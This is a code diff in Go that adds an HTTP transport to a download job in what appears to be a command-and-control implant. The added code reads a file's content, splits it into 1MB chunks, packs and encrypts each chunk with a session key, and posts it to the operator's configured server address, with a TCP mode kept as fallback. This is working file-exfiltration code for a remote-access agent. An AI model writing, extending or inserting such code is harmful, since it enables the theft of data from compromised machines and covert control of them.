@@ -659,6 +659,71 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
+	// =================================
+	// HTTP MODE
+	// =================================
+	if profile.Uri != "" {
+		go func() {
+			targetUrl := ""
+			scheme := "http"
+			if profile.UseSSL {
+				scheme = "https"
+			}
+			targetUrl = fmt.Sprintf("%s://%s%s", scheme, profile.Addresses[0], profile.Uri)
+
+			strFileId := params.Task
+			FileId, _ := strconv.ParseInt(strFileId, 16, 64)
+
+			job := utils.Job{
+				CommandId: utils.COMMAND_DOWNLOAD,
+				JobId:     params.Task,
+			}
+
+			chunkSize := 0x100000 // 1MB
+			totalSize := len(content)
+			for i := 0; i < totalSize; i += chunkSize {
+
+				end := i + chunkSize
+				if end > totalSize {
+					end = totalSize
+				}
+				start := i == 0
+				finish := end == totalSize
+
+				job.Data, _ = msgpack.Marshal(utils.AnsDownload{
+					FileId:   int(FileId),
+					Path:     path,
+					Content:  content[i:end],
+					Size:     len(content),
+					Start:    start,
+					Finish:   finish,
+					Canceled: false,
+				})
+				packedJob, _ := msgpack.Marshal(job)
+
+				message := utils.Message{
+					Type:   2, // Job Data Type
+					Object: [][]byte{packedJob},
+				}
+
+				sendData, _ := msgpack.Marshal(message)
+				sendData, _ = utils.EncryptData(sendData, utils.SKey)
+
+				// Send via HTTP
+				_, _ = sendDataHttp(targetUrl, sendData)
+
+				if finish {
+					break
+				}
+				time.Sleep(time.Millisecond * 100)
+			}
+		}()
+		return nil, nil
+	}
+
+	// =================================
+	// TCP MODE
+	// =================================
 	var conn net.Conn
 	if profile.UseSSL {
 		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
